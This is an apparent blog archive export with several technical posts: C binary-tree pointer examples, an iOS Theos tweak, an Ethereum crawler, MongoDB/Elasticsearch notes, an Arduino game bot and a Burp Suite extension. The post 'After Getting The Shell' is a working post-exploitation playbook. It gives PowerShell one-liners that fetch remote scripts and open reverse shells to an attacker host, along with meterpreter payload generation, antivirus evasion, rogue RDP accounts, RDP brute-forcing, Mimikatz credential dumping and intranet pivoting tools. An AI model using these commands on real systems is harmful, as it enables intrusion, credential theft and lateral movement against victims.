0)?("不"):(" ")); &#125; bstree_dump(tree); while(1) &#123; printf("\r\n查询一个数字，输入100时退出："); scanf("%d",&amp;data); if(data == 100)break; node = bstree_search(tree,data); printf("\r\n %d %s存在树中",data,(node == NULL)?("不"):(" ")); &#125; bstree_dump(tree); while(1) &#123; printf("\r\n删除一个数字，输入100时退出："); scanf("%d",&amp;data); if(data == 100)break; res = bstree_delete(tree,data); printf("\r\n %d 删除%s成功",data,(res != 0)?("不"):(" ")); bstree_dump(tree); &#125; bstree_destory(tree); muntrace(); return 0;&#125; Now let’s focus on the first while loop among the main() block. In this case, the pointer tree was directly passed into the function bstree_insert, it’s kind of odd compared with the previous instances. The difference is that the pointer tree has been allocated memory before passed as an argument. There are actually two pointers which belong to two different address in the memory, but both of them point to the same space. If we change the value of the space one pointer points to, we simultaneously change the value that the other pointer points to. If the extreme performance is what you want, The function bstree_insert can be correctly replaced by bstree_insert2 as below. This conversion can save the time of memory allocation. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int bstree_insert2(bstree ** tree, mytype data)&#123; printf("second address: %d", *tree); bstree_node *node = NULL; bstree_node *tmp = NULL; int res = 0; if (tree == NULL) &#123; return -1; &#125; node = (bstree_node *)malloc(sizeof(bstree_node)); if (node == NULL) &#123; return -2; &#125; node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; /*如果二叉树为空，直接挂到根节点*/ if (bstree_is_empty((*tree))) &#123; (*tree)-&gt;root = node; (*tree)-&gt;size++; return 0; &#125; tmp = (*tree)-&gt;root; while(tmp != NULL) &#123; res = (*tree)-&gt;compare(data,tmp-&gt;data); if (res &gt; 0) /*去右孩子查找*/ &#123; if (tmp-&gt;rchild == NULL) &#123; tmp-&gt;rchild = node; (*tree)-&gt;size++; return 0; &#125; tmp = tmp-&gt;rchild; &#125; else /*去左孩子查找*/ &#123; if(tmp-&gt;lchild == NULL) &#123; tmp-&gt;lchild = node; (*tree)-&gt;size++; return 0; &#125; tmp = tmp-&gt;lchild; &#125; &#125; return -3;&#125; Then modify the main() code: 1res = bstree_insert2(&amp;tree,data); One last instance that we should focus on, there is an implement of a binary tree: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204//binarytree.c#include&lt;assert.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include"list_queue.h"typedef struct _treenode&#123; int data; struct _treenode *lchild; struct _treenode *rchild;&#125;Tnode,Tree;void binarytree_create(Tree **Root)&#123; int a = 0; printf("\r\n输入节点数值((当输入为100时，当前节点创建完成))):"); scanf("%d",&amp;a); if (a == 100) &#123; *Root = NULL; &#125; else &#123; *Root = (Tnode *)malloc(sizeof(Tnode)); if (*Root == NULL) &#123; return; &#125; (*Root)-&gt;data = a; printf("\r\n create %d 的左孩子:",a); binarytree_create(&amp;((*Root)-&gt;lchild)); printf("\r\n create %d 的右孩子:",a); binarytree_create(&amp;((*Root)-&gt;rchild)); &#125; return ;&#125;void binarytree_destory(Tree *root)&#123; if (root == NULL) &#123; return; &#125; binarytree_destory(root-&gt;lchild); binarytree_destory(root-&gt;rchild); free(root);&#125;/*先序遍历:根结点--》左子树---》右子树*/void binarytree_preorder(Tree *root)&#123; if (root == NULL) &#123; return; &#125; printf(" %d ",root-&gt;data); binarytree_preorder(root-&gt;lchild); binarytree_preorder(root-&gt;rchild); return;&#125;/*中序遍历:左子树--》跟节点---》右子树*/void binarytree_inorder(Tree *root)&#123; if (root == NULL) &#123; return; &#125; binarytree_inorder(root-&gt;lchild); printf(" %d ",root-&gt;data); binarytree_inorder(root-&gt;rchild); return;&#125;/*后序遍历:左子树---》右子树-》根节点*/void binarytree_postorder(Tree *root)&#123; if (root == NULL) &#123; return; &#125; binarytree_postorder(root-&gt;lchild); binarytree_postorder(root-&gt;rchild); printf(" %d ",root-&gt;data); return;&#125;void binarytree_levelorder(Tree * root)&#123; list_queue *queue = NULL; Tnode * node = NULL; if(root == NULL) &#123; return; &#125; queue = list_queue_create(); /*根节点先入队*/ list_queue_enqueue(queue,(void *)root); while(!list_queue_is_empty(queue)) &#123; list_queue_dequeue(queue,(void *)&amp;node); printf(" %d ",node-&gt;data); if(node-&gt;lchild != NULL) &#123; list_queue_enqueue(queue,(void *)node-&gt;lchild); &#125; if(node-&gt;rchild != NULL) &#123; list_queue_enqueue(queue,(void *)node-&gt;rchild); &#125; &#125; free(queue);&#125;/*打印叶子节点*/void binarytree_printfleaf(Tree *root)&#123; if (root == NULL) &#123; return; &#125; if ((root-&gt;lchild == NULL) &amp;&amp; (root-&gt;rchild == NULL)) &#123; printf(" %d ",root-&gt;data); &#125; else &#123; binarytree_printfleaf(root-&gt;lchild); binarytree_printfleaf(root-&gt;rchild); &#125;&#125;/*打印叶子的个数*/int binarytree_getleafnum(Tree*root)&#123; if (root == NULL) &#123; return 0; &#125; if ((root-&gt;lchild == NULL) &amp;&amp; (root-&gt;rchild == NULL)) &#123; return 1; &#125; return binarytree_getleafnum(root-&gt;lchild) + binarytree_getleafnum(root-&gt;rchild);&#125;/*打印数的高度*/int binarytree_gethigh(Tree *root)&#123; int lhigh = 0; int rhigh = 0; if (root == NULL) &#123; return 0; &#125; lhigh = binarytree_gethigh(root-&gt;lchild); rhigh = binarytree_gethigh(root-&gt;rchild); return ((lhigh &gt; rhigh)?(lhigh + 1):(rhigh + 1));&#125;int main()&#123; Tree *root = NULL; setenv("MALLOC_TRACE","1.txt",1); mtrace(); printf("\r\n创建二叉树:"); binarytree_create(&amp;root); printf("\r\n先序遍历二叉树:"); binarytree_preorder(root); printf("\r\n中序遍历二叉树:"); binarytree_inorder(root); printf("\r\n后序遍历二叉树:"); binarytree_postorder(root); printf("\r\n层次遍历二叉树:"); binarytree_levelorder(root); printf("\r\n打印二叉树叶子节点:"); binarytree_printfleaf(root); printf("\r\n打印二叉树叶子节点个数:%d",binarytree_getleafnum(root)); printf("\r\n打印二叉树高度:%d",binarytree_gethigh(root)); binarytree_destory(root); return 0;&#125; 1234567891011121314151617181920212223//list_queue.h#ifndef LINK_LIST_QUEUE_H#define LINK_LIST_QUEUE_Htypedef struct _list_queue_node&#123; void *data; struct _list_queue_node *next;&#125;queue_node;typedef struct _list_queue&#123; int num; queue_node *head; queue_node *tail;&#125;list_queue;#define list_queue_is_empty(queue) ((queue-&gt;num) == 0)list_queue *list_queue_create();int list_queue_enqueue(list_queue *queue,void *data);int list_queue_dequeue(list_queue *queue,void **data);#endif 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879//list_queue.c#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include"./list_queue.h"/*创建队列头*/list_queue *list_queue_create()&#123; list_queue * queue = NULL; queue = (list_queue *)malloc(sizeof(list_queue)); if(queue == NULL) &#123; return NULL; &#125; queue-&gt;num = 0; queue-&gt;head = NULL; queue-&gt;tail = NULL; return queue;&#125;int list_queue_enqueue(list_queue *queue,void *data)&#123; queue_node *ptmp = NULL; if(queue == NULL) &#123; return -1; &#125; ptmp = (queue_node *)malloc(sizeof(queue_node)); if (ptmp == NULL) &#123; return -1; &#125; ptmp-&gt;data = data; ptmp-&gt;next = NULL; if (queue-&gt;head == NULL) &#123; queue-&gt;head = ptmp; &#125; else &#123; queue-&gt;tail-&gt;next = ptmp; &#125; queue-&gt;tail = ptmp; queue-&gt;num++; return 0;&#125;/*出队*/int list_queue_dequeue(list_queue *queue,void **data)&#123; queue_node * ptmp = NULL; if ((queue == NULL) || (data == NULL) || list_queue_is_empty(queue)) &#123; return -1; &#125; *data = queue-&gt;head-&gt;data; ptmp = queue-&gt;head; queue-&gt;head = queue-&gt;head-&gt;next; queue-&gt;num--; if (queue-&gt;head == NULL) &#123; queue-&gt;tail = NULL; &#125; free(ptmp); return 0;&#125; Let’s review the code of binarytree.c and replace the function binarytree_create by binarytree_create2: 12345678910111213141516171819202122232425262728void binarytree_create2(Tree *Root)&#123; int a = 0; printf("\r\n输入节点数值((当输入为100时，当前节点创建完成))):"); scanf("%d",&amp;a); if (a == 100) &#123; Root = NULL; &#125; else &#123; Root = (Tnode *)malloc(sizeof(Tnode)); if (Root == NULL) &#123; return; &#125; Root-&gt;data = a; printf("\r\n create %d 的左孩子:",a); binarytree_create(Root-&gt;lchild); printf("\r\n create %d 的右孩子:",a); binarytree_create(Root-&gt;rchild); &#125; return;&#125; 1binarytree_create(root); Is that right? definitely not. The code can be surely compiled successfully, but the procedure will stop at function binarytree_preorder. Remember? The pointer cannot be directly passed as an argument if there will be memory allocation to the pointer later. the original pointer will always stay NULL. In addition, remember to free memory in each example to avoid memory leaks if I didn’t do that.]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Experiment of Tweak for iOS]]></title>
    <url>%2F2018%2F11%2F20%2FThe-Experiment-of-Tweak-for-iOS%2F</url>
    <content type="text"><![CDATA[Tweak for what?You can make a choice of whatever you want to add a tweak on iOS. For me, I started with the SpringBoard of iOS. So, what is SpringBoard? SpringBoard is the application that manages the home screen on iOS devices. Essentially SpringBoard is like the mobile version of a desktop. Mac OS X features the Finder while Windows computers have the Explorer. And what does the tweak affect? This tweak works when the user triggers a respring(A respring restarts the user interface (SpringBoard) of the iOS operating system. The main difference between a restart and a respring is that a respring doesn’t switch off the system.). Get the environment readyThe framework I used during the tweak development is Theos(https://github.com/theos/theos), an efficient and powerful framework. It’s simple to clone the project and execute the chmod directive, so I omit that here and come to the steps different from the old version of Theos. Install dpkg and ldid which is used to sign your package instead of codesign in Xcode. 1brew install dpkg ldid If you don’t have Homebrew, you just need one command to get it and then you’re good to go. 1/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" The operation of sudo /opt/theos/bin/bootstrap.sh substrate is not needed with the latest version of Theos. When everything is done, remember to set theenvironment variables: 123export THEOS=/opt/theosexport PATH=/opt/theos/bin/:$PATHexport THEOS_MAKE_PATH=$THEOS/makefiles All the preparations have been finished, we can now dive into the interesting section. Functions hookingI post the final result appears on my device here:Apple has given many APIs for AppStore developers, but it’s not enough compared to the mammoth APIs which can be exposed on the jailbroken device. When it comes to developing tweaks, it’s actually changing the behavior by hooking functions. But it’s not easy to find out how the functionality implemented among the code. In fact, it takes lots of time to figure out the logic of the substrate. I just implement the common work supplied by other people. Generate a template.Type nic.pl and choose an option from the given list. We want to generate a tweak template, so input 13. Then finish the following information.When you see the output of “Done.”, there will be 4 files generated under your working directory: 1Makefile commonproject.plist Tweak.xm control Modify files as you needMakefile is generally used in most projects to get everything done properly. In our project, it used to point out files, libraries and frameworks we need. 12345678910111213THEOS_DEVICE_IP = 10.1.2.34ARCHS = armv7 arm64TARGET = iphone:latest:8.0include $(THEOS)/makefiles/common.mkTWEAK_NAME = commonprojectcommonproject_FILES = Tweak.xmcommonproject_FRAMEWORKS = UIKitinclude $(THEOS_MAKE_PATH)/tweak.mkafter-install:: install.exec "killall -9 SpringBoard" We write our code about functions hooking and other useful snippets in the Tweak.xm file. 123456789101112131415%hook SpringBoard // Hooking an instance method with an argument.- (void)applicationDidFinishLaunching:(id)application &#123; %orig; // Call through to the original function with its original arguments. UIAlertView *alert = [[UIAlertView alloc]initWithTitle:@"此广告位常年招商" message:nil delegate:self cancelButtonTitle:@"OK"otherButtonTitles:nil]; [alert show]; [alert release]; // If you use %orig(), you MUST supply all arguments (except for self and _cmd, the automatically generated ones.)&#125;// Always make sure you clean up after yourself; Not doing so could have grave consequences!%end The control file contains the basic information of your deb package, all of them will be packed in your deb package. 12345678910Package: appleName: commonprojectDepends: mobilesubstrateVersion: 0.0.1Architecture: iphoneos-armDescription: iOS tweak learning.Maintainer: zAuthor: zSection: TweaksHomepage: http://recursively.review The *.plist file contains the configuration of your package. 1&#123; Filter = &#123; Bundles = ( "com.apple.springboard" ); &#125;; &#125; Install your packageNext, we need to install our package onto the iOS device with directive make package install remotely through the ssh. But firstly, you should have installed OpenSSH. You need to input your password of ssh twice during the installation process. If no errors prompt out you can respring your iOS device and easily see the result I’ve shown above. SourcesiOS App Reverse Engineering]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Theos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[After Getting The Shell]]></title>
    <url>%2F2018%2F11%2F02%2FAfter-Getting-The-Shell%2F</url>
    <content type="text"><![CDATA[Here gives two methods to trigger a windows reverse shell with PowerShell, remember to bypass the PowerShell security policy before you execute PowerShell command. (https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) For attacker: 1nc -lvp 6666 For target: 12powershell IEX (New-Object System.Net.Webclient).DownloadString('http://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c x.x.x.x -p 6666 -e cmd 12powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -port 6666 Sometimes the protection system on the server will block PowerShell from downloading anything, there are two tools to help you: 1bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip 1certutil -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip Most of the time you will face three situations: You don’t have administrator privilege, but there is no protection system.If you’re lucky enough, there’s no anti-virus software in the system, you can trigger a reverse Metasploit shell in any method you like:In an easy way: 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; a.exe All you need to do is uploading the payload and execute it. When it comes to the question of how to upload the payload, the answer is that you must forward your local port to the public network with the help of FRP(https://github.com/fatedier/frp) which is a powerful tool, and you must have a VPS to achieve that. Even if you don’t have a VPS, you can use ngrok to make it work. There is protection system in the server, but you have administrator privilege.If you’re not so lucky, maybe you should find some methods such as veil-evasion to obfuscate your payload. In worse situation, your payload which has been obfuscated was deleted by the antivirus as well. you’d better consider killing the process of the antivirus. Sometimes it’s not easy to kill the process of antivirus, you can just log into the system by the remote desktop protocol. The first step is to add a new user to the system: 1net user Name Pass /add Then you should add this user to the allowed rdp accounts from the commandline: 1net localgroup "Remote Desktop Users" domain\user /add If you want to add a non-domain user, it’s easier: 1net localgroup "Remote Desktop Users" user /add But you cannot do crazy things with this account, but you can identify which protection system the server use and shutdown it or bypass it. It’s not done yet if you want to execute some high-privilege command, privilege escalation could be taken into consideration. Hydra is a powerful tool if you have a powerful wordlist: 1hydra x.x.x.x rdp -L users.txt -P wordlist.txt -v Mimikatz is also a good choice to dump the username and password from memory of the server. But most of the time mimikatz will be killed by the protection system. You don’t have the administrator privilege, and the server has a protection system.Shutdown your computer and go to sleep unless you have some 0day vulnerabilities. There are some ways to help you to go deep and you can treat your victim as a pivot to find out more vulnerable hosts within the intranet. Firstly try to add the routing rules of the target to your meterpreter shell. An msf built-in module “autoroute” and is convenient. (https://www.offensive-security.com/metasploit-unleashed/proxytunnels/) 1meterpreter &gt; run post/multi/manage/autoroute You can enumerate hosts by performing an ARP scan: 1meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.5.1/24 Adding routing rule is not always working well, you can try the socks4a module in meterpreter: 123use anxiliary/server/socks4aset srvport 1080run If it’s Linux in your local machine, you can use proxychains to set the socks5 proxy.Getting proxychains installed: 1apt install proxychains-ng Add the following content into the /etc/proxychains.conf file: 1socks4 127.0.0.1 1080 Then you can use socks proxy to scan the victim’s intranet: 1proxychains4 nmap -sT -Pn --open 192.168.5.0/24 I have tried so many times to find out all the machines in the victim’s intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet. Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine’s port to your VPS and use proxychains or proxifier in your local machine:For your VPS: 1./ew -s rcsocks -l 1080 -e 1024 The command above means your VPS listens the port 1080, 1024 and waits for attacker connect to the port 1080, the victim connects to the port 1024. For target: 1ew.exe -s rssocks -d x.x.x.x -e 1024 The argument -d is the IP address of your VPS. Add the following content into the /etc/proxychains.conf file: 1socks5 x.x.x.x 1080 Use proxychains to scan rest of the hosts: 1proxychains4 nmap -sT -Pn -open 192.168.5.0/24 Here comes the point, most of the antivirus will treat EarthWorm as the threat to the system and it will possibly be killed. I’d like to recommend another open-source tool called ssocks.(https://github.com/tostercx/ssocks) You can build the source code by yourself. The usage is similar to EarthWorm: For your VPS: 1rcsocks -l 1088 -p 1080 -vv For target: 1./rssocks -s x.x.x.x:1080 -vv The configuration and operation of proxychains is same as previous description. If you need ports forwarding, it’s also available in meterpreter: (https://www.offensive-security.com/metasploit-unleashed/portfwd/) 1meterpreter &gt; portfwd add –l 3389 –p 3389 –r 192.168.5.100 Another popular tool is lcx.exe:For attacker: 1lcx -listen 2222 3333 For target: 1lcx -slave x.x.x.x 2222 127.0.0.1 3389 The IP x.x.x.x is the address of your public VPS. Finally execute mstsc x.x.x.x:3333 to connect to the remote desktop of the target. There are many other useful tools except for the tools I mentioned above, such as netcat, ncat and ssf. You can make a choice among them as you like.]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>PowerShell</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Smart Contract Sourcecode Crawler]]></title>
    <url>%2F2018%2F07%2F09%2FSmart-Contract-Sourcecode-Crawler%2F</url>
    <content type="text"><![CDATA[The method to crawl the Ethereum blockchainThe simplest way is to get all of the blocks from Etherscan.io and can save much of my local space. I’ve tried to grab all of the transactions from Etherscan.io, but my IP was banned after a few of trials. So I have to synchronize the whole node of Ethereum blockchain into my local machine. My purpose is to grab the sourcecode of the smart contract, but it’s not feasible to get the sourcecode from the bytecode itself. (Refer this question: https://ethereum.stackexchange.com/questions/26648/how-to-find-solidity-code-for-a-contract-address) Get information by web3I used the web3.eth.getCode() method to identify whether an address is a contract or not. At first, I synchronized the whole node by adding argument –fast, and I cannot get the bytecode with web3.eth.getCode(). Maybe something was missing in this way of sync. So I deleted the database and added the argument –syncmode: 1geth --rpc --rpcaddr=127.0.0.1 --syncmode=full Then everything works well. If you don’t want to sync the node into your local disk, you can also choose the public geth node like infura to use. In addition to the large usage of disk, the sync process will get extremely slower from block #2283397 to #2700031 because of the denial of service attack on 2016/09/18. (https://github.com/ethereumbook/ethereumbook/blob/develop/clients.asciidoc) Use the Etherscan APIsLearn about how Ethereum developer APIs work: https://etherscan.io/apis There are some useful APIs, for example: Get transaction receipt:https://api.etherscan.io/api?module=proxy&amp;action=eth_getTransactionReceipt&amp;txhash=0x6ed68687dc6ccc5ecd17a4842c260aab1de356fdbf2d3d7ef5f8c95f5f0d2035&amp;apikey=YourApiKeyToken Get sourcecode:https://api.etherscan.io/api?module=contract&amp;action=getsourcecode&amp;address=0xc368A8E22e09CEA6e0Ca160309d94B792729892d&amp;apikey=YourApiKeyToken I used the getsourcecode api to get the verified contract. If the contract is not verified, this api will not work. Finally, you can check the states of your API from Etherscan.io: Separate the blocks into slicesThe whole Ethereum blockchain contains over 5000,000 blocks, you’d better not get all of them into your computer memory. It’s not complicated to solve it, you just need to separate the blocks into slices. 12345678910111213141516def spider(blocklist): transactions = [] # blocklist = list(range(blockstart, blockend)) threadLock.acquire() for i in range(int(len(range(blockstart, blockend)) / slice_len)): threadLock.acquire() for block in blocklist[0:slice_len]: transactions += (w3.eth.getBlock(block)['transactions']) get_addr_code(transactions) del blocklist[0:slice_len] transactions = [] threadLock.release() threadLock.release() for block in blocklist: # go over the last slice of the blocklist transactions += (w3.eth.getBlock(block)['transactions']) get_addr_code(transactions) Something trickyI wanted to add the multiprocessing module to accelerate the crawling process, but I failed because of some strange reasons on Mac. Finally, I used the threading module to achieve that, but the result doesn’t meet my expectations.]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Crawler</tag>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brief Usage of MongoDB and Elasticsearch]]></title>
    <url>%2F2018%2F07%2F03%2FBrief-Usage-of-MongoDB-and-Elasticsearch%2F</url>
    <content type="text"><![CDATA[Store Data in MongoDBTo store data in MongoDB database, I use the python module pymongo as shown below: 12345678910111213141516import pymongoclient = pymongo.MongoClient("mongodb://%s:%s@127.0.0.1" % ('user', 'password'), port=22222)def mongodbexec(name, contact, groupnumber, groupname, timeStamp, card, nick): member = &#123; 'groupcard': card, 'groupnumber': groupnumber, 'groupname': groupname, 'contact': contact, 'nickname': nick, 'qqage': memberindex[name][1], 'qq': memberindex[name][2], 'timestamp': timeStamp, &#125; QQres.insert_one(member) And for security, adding an auth process is necessary. In mongo console: 12use admin //switch to admin databasedb.createUser(&#123;user:'root', pwd: 'password', roles: ['root']&#125;) //create an administrator If you want to change your user’s password later, you can use the changeUserPassword command: 1db.changeUserPassword('root','password1') Then you should start mongod with argument ‘–auth’: 1mongod --port 27017 --dbpath /data/db1 --auth If you want to login into mongo console, you must provide your username and password like this: 1mongo admin -u root -p password Export data to csv(https://docs.mongodb.com/manual/reference/program/mongoexport/): 1mongoexport --username xxx --password xxx --authenticationDatabase admin --db xxx --collection xxx --type csv --fields xxx,xxx --out .../output.csv Export MongoDB Database Into ElasticsearchThere are some useful tools to finish this job such as mongo-connector, transporter, etc. But I met some problems when I use mongo-connector and I speculate it’s the incompatibility of versions between mongo-connector and Elasticsearch. So I chose transporter which is an open source and high-efficiency tool built with go. It’s easy to build and configure. More details: https://github.com/compose/transporter. When building finished, the first thing is to initialize the transporter: 1transporter init mongodb elasticsearch This step will generate a file pipeline.js under the directory of cmd/transporter, open and modify the file: 12345678910111213141516171819202122var source = mongodb(&#123; "uri": "mongodb://127.0.0.1:22222/database" // "timeout": "30s", // "tail": false, // "ssl": false, // "cacerts": ["/path/to/cert.pem"], // "wc": 1, // "fsync": false, // "bulk": false, // "collection_filters": "&#123;&#125;", // "read_preference": "Primary"&#125;)var sink = elasticsearch(&#123; "uri": "http://elastic:password@localhost:9200/database" // "timeout": "10s", // defaults to 30s // "aws_access_key": "ABCDEF", // used for signing requests to AWS Elasticsearch service // "aws_access_secret": "ABCDEF" // used for signing requests to AWS Elasticsearch service // "parent_id": "elastic_parent" // defaults to "elastic_parent" parent identifier for Elasticsearch&#125;)t.Source("source", source, "/.*/").Save("sink", sink, "/.*/") Finally run the transporter to transfer the database from MongoDB to Elasticsearch. 1transporter run Retrieve Keywords With ElasticsearchReading the docs to learn about the usage of Elasticsearch: https://www.elastic.co/guide/index.html.]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mongodb</tag>
        <tag>Elasticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tricks for Wechat Tiaoyitiao Mini Program]]></title>
    <url>%2F2018%2F05%2F11%2FTricks-for-Wechat-Tiaoyitiao-Mini-Program%2F</url>
    <content type="text"><![CDATA[How does it act? Distinguish the ScreenshotFirst of all, we need to work out the program to distinguish the chess piece and board, furthermore, finding the distance between the chess piece and the target position and calculating the pressing time. It’s definitely a complicated process. I used the open-source project https://github.com/wangshub/wechat_jump_game. We should connect the mobile phone to the computer with USB and make sure that we have installed android adb debug command so that the mobile phone can take screenshots via the program for the next manipulation. Control the Servo With ArduinoI wrote the C program with Arduino IDE, the Arduino serial only accepts string type input, for convenience I use the char_to_int(char i) function to transform the input type. The servo moves to an angle decided by the .write(angle) method, the parameter angle can be different in other situations. The delay time is associated with pressing time based on the distance between the target position and chess piece. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;Servo.h&gt;Servo myservo;int char_to_int(char i)&#123; switch(i) &#123; case '0':return 0; case '1':return 1; case '2':return 2; case '3':return 3; case '4':return 4; case '5':return 5; case '6':return 6; case '7':return 7; case '8':return 8; case '9':return 9; default:return 0; &#125;&#125;void setup() &#123; Serial.begin(9600); pinMode(10, OUTPUT); myservo.attach(10); myservo.write(0); delay(1000);&#125;void loop() &#123; char a, b, c; int i; while(!Serial.available()); if(Serial.available()) &#123; a = Serial.read(); delay(3); &#125; if(Serial.available()) &#123; b = Serial.read(); delay(3); &#125; if(Serial.available()) &#123; c = Serial.read(); delay(3); &#125; if(b == NULL) &#123; i = char_to_int(a); Serial.println(i, DEC); &#125; else if(c == NULL) &#123; i = char_to_int(a) * 10 + char_to_int(b); Serial.println(i, DEC); &#125; else &#123; i = char_to_int(a) * 100 + char_to_int(b) * 10 + char_to_int(c); Serial.println(i, DEC); &#125; i = i*23; myservo.write(60); delay(i); myservo.write(0);&#125; Control the Arduino SerialIn order to control the Arduino serial input value, we can use the serial monitor embedded in the Arduino IDE. And we can also use python to Implement the same functionality. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python #coding=utf-8 import serial #from serial import * import time import threading import glob inhead = 'RECV' outhead = 'SEND' class SerialData(threading.Thread): def __init__(self): threading.Thread.__init__(self) def open_com(self, port, baud): self.ser = serial.Serial(port, baud, timeout = 0.5) return self.ser def com_isopen(self): return self.ser.isOpen() def send_data(self, data, outhead = outhead): self.ser.write(outhead + data) def next(self): all_data = '' #if inhead == self.ser.read(1) : all_data = self.ser.readline() return all_data def close_listen_com(self): return self.ser.close() if __name__ == '__main__': try: rec_data = SerialData() allport = glob.glob('/dev/ttyACM*') port = allport[0] baud = 9600 openflag = rec_data.open_com(port, baud) if openflag: print 'i open %s at %s successfully!'%(allport[0], baud) rec_data.send_data('90') rec_data.close_listen_com() except KeyboardInterrupt: rec_data.close_listen_com() if not rec_data.com_isopen(): print('serial closed') Combine the CodesThe last step is combining the picture distinguishing code and the serial controlling code. I’ve run the code with python3.6 and the whole process performed well.]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Arduino</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite Jython Extension for Passive Scanner]]></title>
    <url>%2F2018%2F05%2F08%2FBurpSuite-Jython-extension-for-passive-scanner%2F</url>
    <content type="text"><![CDATA[BurpSuite Jython ExtensionIn order to glean the vulnerability detection information and avoid scanning the massive useless URLs of the websites, I prefer using passive scanner during my daily work. I’d like to use BurpSuite to analyze URLs and store them in the database for the next passive scanning process via socket tunnel. But here comes the problem, BurpSuite cannot transfer https flow to another place, so I wrote a simple Jython script as the disposal. Tutorial about writing a Jython extension can be found everywhere. Here I put the main code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo): # only process requests if not messageIsRequest: # create a new log entry with the message details self._lock.acquire() row = self._log.size() req = self._helpers.analyzeRequest(messageInfo) LE = LogEntry(toolFlag, self._callbacks.saveBuffersToTempFiles(messageInfo), req.getUrl()) self._log.add(LE) try: params = req.getParameters() pas = [] pnames = [] for pa in params: pnames.append(pa.getName()) pas.append(pa.getName()+"="+pa.getValue()) #pas = pas.join('&amp;') values = &#123;"docs":[&#123;"TIME":time.time(),"URL":LE._url.toString(),"PNames":'&amp;'.join(pnames),"Method":req.getMethod(),"HOST":LE._url.getHost(),"PATH":LE._url.getPath(),"PARAM":'&amp;'.join(pas),"REQ":LE._requestResponse.getRequest().tostring(),"RESP":LE._requestResponse.getResponse().tostring(),"USER":"test"&#125;]&#125; #data = 'docs=[&#123;"URL":"'+LE._url.toString()+'","REQ":"'+urllib.quote(LE._requestResponse.getRequest().tostring())+'","RESP":"'+urllib.quote(LE._requestResponse.getResponse().tostring())+'"&#125;]' # data = "docs="+urllib.quote(json.dumps(values['docs'], sort_keys=True)) send_data = &#123;&#125; req_url = LE._url.toString() req_headers, req_body = split_req(LE._requestResponse.getRequest().tostring()) o = urlparse(req_url) req_host = o.netloc req_headers['Host'] = req_host req_method = req.getMethod() data = extract_request(req_url, req_headers, req_method, req_body) send_data['req_url'] = req_url send_data['req_headers'], send_data['req_body'] = req_headers, req_body send_data['req_host'] = req_host send_data['req_method'] = req_method send_data['data'] = data print(send_data) target_url = "http://192.168.10.57:8888" res = urllib2.Request(target_url, str(send_data)) threading.Thread(target=urllib2.urlopen, args=(res,)).start() except: pass self.fireTableRowsInserted(row, row) self._lock.release() return def extract_request(url, headers, method, body): try: a = re.search('://.*?/(.*)', url) except: pass url = ('/' + a.group(1)) if a is not None else '/' requests = "%s %s\r\n" % (method, url) for key, value in headers.items(): requests += "%s: %s\r\n" % (key, value) requests += "\r\n%s" % body return requests the function extract_request(url, headers, method, body) is used to transform requests and the processHttpMessage(self, toolFlag, messageIsRequest, messageInfo) function is used to send the BurpSuite URLs to another server which is started locally. Sure, there’s no need to do such complicated work, but I can’t find some modules(redis) I need in Jython, maybe you have better ideas I don’t know…Start a server I put my server code below: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from http.server import BaseHTTPRequestHandler, HTTPServerimport loggingfrom lib.redisopt import content_dealclass S(BaseHTTPRequestHandler): def _set_response(self): self.send_response(200) self.send_header('Content-type', 'text/html') self.end_headers() def do_GET(self): self.wfile.write("GET request for &#123;&#125;".format(self.headers).encode('utf-8')) def do_POST(self): content_length = int(self.headers['Content-Length']) # &lt;--- Gets the size of data post_data = self.rfile.read(content_length) # &lt;--- Gets the data itself receive_data = eval(post_data.decode('utf-8')) req_url 